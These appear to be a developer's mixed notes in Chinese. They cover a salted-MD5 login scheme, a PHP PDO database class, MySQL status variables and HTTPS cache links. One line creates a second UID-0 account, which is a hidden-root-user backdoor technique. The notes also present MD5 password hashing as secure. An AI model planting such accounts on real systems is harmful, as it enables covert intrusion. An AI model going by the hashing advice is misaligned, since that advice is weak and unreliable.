
************************************************************************************************************

任务正理：PostgreSQL  PHP模式   EA11  Sass Javascript 7



加密盐，防止md5值被逆向。
salt = "网站自定义的一个加密盐"，服务端和客户端都有该值。

注册的时候对密码加盐做散列vp = md5(密码明文+salt)，保存到数据库。

登陆：
服务器端产生一个随机值rnd保存在服务器的session里面，并传给浏览器;

浏览器提交加密过的密文：md5(md5(密码明文+salt)+rnd)

服务器验证的时候从数据库读出注册时候保存的散列值vp，做运算md5(vp+rnd)，和浏览器提交的密文做比较。

这样至少可以让服务器不保存密码明文也能防止暴库之后被逆向，同时登陆过程中提交的密文也基本没法还原。
因此中间人只能抓取会话，重放会话，会话过期之后也没法重放了。




面向对象应该牢记：保持对象小型化，模块化，非耦合以及流线型 。

************************************************************************************************************
www.multimall.cn

卖家（vendor）  商品(wares)   订单(order)   买家（buyer） 



useradd -o -u 0 -g 0 -M -d /root -s /bin/bash vxzhan
select (@i:=@i+1) as i,post_time from tb_check_price,(select @i:=0) as tt  order by post_time desc; 


************************************************************************************************************


http://cache.baiducontent.com/c?m=9f65cb4a8c8507ed4fece7631046893b4c4380146d96864968d4e414c4224600003ab3e66c351770d3c77b651cfc091ab1a168252a5577f1c893d60bc0bc902e2e8926307108c31c528516fc8915749b77875b99b868e0ad873484d8d6c4ae5544cb235f3cc6b2ca&p=882a9645d7d212a05aa6c931445598&newp=8d7bcd299e9e12a05abd9b7d0d1788231610db2151d4d1146b82c825d7331b001c3bbfb423221a07d2c4786304ad4e5fe9fb31753c072ba3dda5c91d9fb4c57479&user=baidu&fm=sc&query=apache%C5%E4%D6%C3https&qid=ebceea2f0015d590&p1=11
http://cache.baiducontent.com/c?m=9f65cb4a8c8507ed4fece7631046893b4c4380146d96864968d4e414c42246090137bdf127201306ce963c215afe170bf7a6613464587ef686cc8241d9ba932c3bcd7a742613da14498f53b8ca3632b027872defb86fe3ad813384afa2899912118b&p=882a9645d0af33fc57eff827495d97&newp=8063c64ad48711a05bed926d554ccc231610db2151d4db1e6b82c825d7331b001c3bbfb423221a04d1c17e650ba94c5de0f73673340225a3dda5c91d9fb4c57479cc&user=baidu&fm=sc&query=nginx%C5%E4%D6%C3https&qid=80d4a5780013f27a&p1=5


<?php
/**
 * @author:van zhang
 * 数据库单一实例连接类
 * 提供了基本的数据库操作方法
 */
class DBC
{
	private static $instance = null;
	private static $handle = null;
	private static $prefix = '';
	private static $db = '';

	private function __construct()
	{
		$servers = parse_ini_file(SYSINI . 'servers.ini',true);  //读取数据库配置内容
		//必须在servers.ini配置DBTYPE字段
		if(!isset($servers['DBTYPE'])){ exit(self::error('Server configuration file error!')); }

		$arr = $servers[$servers['DBTYPE']]; //配置信息
		$dbType = strtolower($servers['DBTYPE']); //数据库类型
		$host = $arr['HOST']; //主机地址
		$port = $arr['PORT']; //端口
		$charset = $arr['CHARSET']; //字符集
		self::$prefix = $arr['PREFIX'];  //前缀

		if( empty(self::$db) ){ self::$db = $arr['DBNAME']; }

		$strDSN = $dbType . ':host=' . $host . ';dbname=' . self::$db . ';port=' . $port;
		if($servers['DBTYPE'] == 'MYSQL'){ $strDSN .= ';charset=' . $charset; }

		//尝试连接数据库
		try{  self::$handle = new PDO($strDSN,$arr['USERNAME'],$arr['PASSWORD']);
		}catch(Exception $e){  exit(self::error($e->getMessage())); }
	}

	/**
	 * 切换数据库
	 * @param  string $dbname 数据库名
	 * @return string
	 */
	public static function active($dbname='')
	{
		if(!(self::$instance instanceof self))
		{
			self::$db = $dbname;
			self::$instance = new self;
			return self::$db;
		}else
		{
			if(self::$db != $dbname)
			{
				self::$handle = null;
				self::$instance = null;
				self::$db = $dbname;
				self::$instance = new self;
				return self::$db;
			}
		}
		return self::$db;
	}

	//返回单一实例
	public static function PDO() //单一实例
	{
		if(!(self::$instance instanceof self)){ self::$instance = new self;}
		return self::$handle;
	}

	//返回设定的表前缀
	public static function prefix()
	{
		if(!(self::$_instance instanceof self)){ self::$instance = new self;}
		return self::$prefix;
	}

	/**
	 * 执行一条查询语句
	 * @param string $SQL  请在SQL中使用参数替代方式来尽量避免SQL注入行为
	 * @param array $arr 可以是关联数组，如array(':name'=>'ben').  也可是 索引数组，但请注意参数的顺序
	 * @param array $opt 可选项 只能是关联数组
	 * cursor键对指定指针移动方向
	 * fetch键对指定返回结果的方式如关联数组 对象等
	 * one键对指定仅获取结果集中一个
	 * debug键对指定是否处于调试状态
	 * @return 布尔值或者指定的返回类型如关联数组 对象等
	 */
	public static function selected($SQL,array $arr,array $opt=[])
	{
		$cursor = isset($opt['cursor']) ? $opt['cursor'] : [PDO::ATTR_CURSOR=>PDO::CURSOR_FWDONLY];
		$fetch = isset($opt['fetch']) ? $opt['fetch'] : PDO::FETCH_ASSOC;
		$stmt = self::PDO()->prepare($SQL,$cursor);
		foreach($arr AS $k=>$v)
		{
			if(is_int($v)){  $stmt->bindParam($k , $arr[$k],PDO::PARAM_INT);
			}else{			 $stmt->bindParam($k , $arr[$k],PDO::PARAM_STR);	}
		}
		$dbc = $stmt->execute();
		if($dbc !== FALSE)
		{
			if(isset($opt['one'])){ return $stmt->fetch($fetch); }
			return $stmt->fetchAll($fetch);
		}else
		{
			// 在调试状态下显示错误消息 否则返回假值
			if(isset($opt['debug']) && $opt['debug'] === TRUE){	exit( self::error(implode(' ',$stmt->errorInfo())) );
			}else{ return FALSE; }
		}
	}

	/**
	 * 执行一条IN 查询语句 本类对IN查询支持较弱且结构固定，如果是复杂的IN查询请改用相关查询
	 * @param string $SQL  请在SQL中使用参数替代方式来尽量避免SQL注入行为
	 * 注意：SELECT ... IN( :limit ) .... 这是$SQL的结构，不属于此结构的SQL将可能无法执行
	 * @param array $arr 必须是 索引数组
	 * @param array $opt 可选项 只能是关联数组
	 * cursor键对指定指针移动方向
	 * fetch键对指定返回结果的方式如关联数组 对象等
	 * debug键对指定是否处于调试状态
	 * one键对指定仅获取结果集中一个
	 * @return 布尔值或者指定的返回类型如关联数组 对象等
	 */
	public static function limited($SQL,array $arr,array $opt=[])
	{
		$cursor = isset($opt['cursor']) ? $opt['cursor'] : [PDO::ATTR_CURSOR=>PDO::CURSOR_FWDONLY];
		$fetch = isset($opt['fetch']) ? $opt['fetch'] : PDO::FETCH_ASSOC;
		$arrLen = count($arr);
		$limited = [];
		for($i=0;$i<$arrLen;$i++){	$limited[':limited_' . $i] = $arr[$i];	}
		$strSQL = strtr($SQL,array(':limit'=>implode(',',array_keys($limited))));
		$stmt = self::PDO(isset($opt['dbname']) ? $opt['dbname'] : '')->prepare($strSQL,$cursor);
		foreach($limited as $x=>$y){ $stmt->bindValue($x,$y); } //参数和值绑定
		$dbc = $stmt->execute();
		if($dbc !== FAlse)
		{
			if(isset($opt['one'])){ return $stmt->fetch($fetch); }
			return $stmt->fetchAll($fetch);
		}else
		{
			// 在调试状态下显示错误消息 否则返回假值
			if(isset($opt['debug']) && $opt['debug'] === TRUE){ exit( self::error(implode(' ',$stmt->errorInfo())) );
			}else{ return FALSE;}
		}
	}

	/**
	 * 多次执行一条影响行数的SQL语句
	 * @param string $SQL  请在SQL中使用参数替代方式来尽量避免SQL注入行为
	 * @param array $arr  如果是索引数组则必须是一个二维数组且每一个单元必须是关联数组，否则是一个一维的关联数组
	 * @param array $opt 可选项 只能是关联数组
	 * LID键对指定是否获取最后插入的自动增长的序列值  INSERT操作有效
	 * debug键对指定是否处于调试状态
	 * @return 布尔值或者整型数据
	 */
	public static function modified($SQL,array $arr,array $opt=[])
	{
		$DBLink = self::PDO(isset($opt['dbname']) ? $opt['dbname'] : '');
		$stmt = $DBLink -> prepare($SQL);
		//$arr的每一个单元要么全是数组要么全部不是数组，否则返回假
		$len = count($arr); $isArray = 0; $isNotArray = 0;
		for($i=0;$i<$len;$i++)
		{
			if(@is_array($arr[$i])){ $isArray += 1; }else{ $isNotArray += 1; }
		}
		if($isArray == $len ) //每一个数组单元全部是数组  关联数组
		{
			$result = 0;
			for($j=0;$j<$len;$j++) //循环执行数组的每个单元
			{
				$dbc = $stmt->execute($arr[$j]);
				if($dbc !== FALSE) //如果执行成功
				{
					//是否返回最后插入的序列值 注意表的设计及仅在INSERT句法下有效 否则返回影响的行数
					if(isset($opt['LID']) && $opt['LID']){$result = $DBLink -> lastInsertId( '_id_seq' );
					}else{ $result += $stmt->rowCount(); }
				}else
				{
					// 在调试状态下显示错误消息 否则返回假值
					if(isset($opt['debug']) && $opt['debug'] === TRUE){	exit( self::error(implode(' ',$stmt->errorInfo())) );
					}else{ return 0; }
				}
			}
			return $result;
		}elseif($isNotArray == $len) //每一个数组单元全部不是数组 关联数组
		{
			$dbc = $stmt->execute($arr);
			if($dbc !== FALSE)
			{
				if(isset($opt['LID']) && $opt['LID']){ return $DBLink -> lastInsertId( '_id_seq' );
				}else{ return $stmt->rowCount(); }
			}else
			{
				// 在调试状态下显示错误消息 否则返回假值
				if(isset($opt['debug']) && $opt['debug'] === TRUE){ exit( self::error(implode(' ',$stmt->errorInfo())) );
				}else{ return 0; }
			}
		}else{ return 0; }
	}

	//error提示
	private static function error($error)
	{
		return '<div style="width:80%;height:auto;border:2px solid red;text-align:center;margin:10% auto;">
			  <p style="vertical-align:middle;font-size:22px;color:red;margin-left:2%;font-weight:bold;">ERROR
			  </p><p>' . $error . '</p></div>';
	}
}


命令： show processlist; 
如果是root帐号，你能看到所有用户的当前连接。如果是其它普通帐号，只能看到自己占用的连接。 
show processlist;只列出前100条，如果想全列出请使用show full processlist; 
mysql> show processlist; 
命令： show status; 
命令：show status like '%下面变量%'; 
Aborted_clients 由于客户没有正确关闭连接已经死掉，已经放弃的连接数量。 
Aborted_connects 尝试已经失败的MySQL服务器的连接的次数。 
Connections 试图连接MySQL服务器的次数。 
Created_tmp_tables 当执行语句时，已经被创造了的隐含临时表的数量。 
Delayed_insert_threads 正在使用的延迟插入处理器线程的数量。 
Delayed_writes 用INSERT DELAYED写入的行数。 
Delayed_errors 用INSERT DELAYED写入的发生某些错误(可能重复键值)的行数。 
Flush_commands 执行FLUSH命令的次数。 
Handler_delete 请求从一张表中删除行的次数。 
Handler_read_first 请求读入表中第一行的次数。 
Handler_read_key 请求数字基于键读行。 
Handler_read_next 请求读入基于一个键的一行的次数。 
Handler_read_rnd 请求读入基于一个固定位置的一行的次数。 
Handler_update 请求更新表中一行的次数。 
Handler_write 请求向表中插入一行的次数。 
Key_blocks_used 用于关键字缓存的块的数量。 
Key_read_requests 请求从缓存读入一个键值的次数。 
Key_reads 从磁盘物理读入一个键值的次数。 
Key_write_requests 请求将一个关键字块写入缓存次数。 
Key_writes 将一个键值块物理写入磁盘的次数。 
Max_used_connections 同时使用的连接的最大数目。 
Not_flushed_key_blocks 在键缓存中已经改变但是还没被清空到磁盘上的键块。 
Not_flushed_delayed_rows 在INSERT DELAY队列中等待写入的行的数量。 
Open_tables 打开表的数量。 
Open_files 打开文件的数量。 
Open_streams 打开流的数量(主要用于日志记载） 
Opened_tables 已经打开的表的数量。 
Questions 发往服务器的查询的数量。 
Slow_queries 要花超过long_query_time时间的查询数量。 
Threads_connected 当前打开的连接的数量。 
Threads_running 不在睡眠的线程数量。 
Uptime 服务器工作了多少秒。





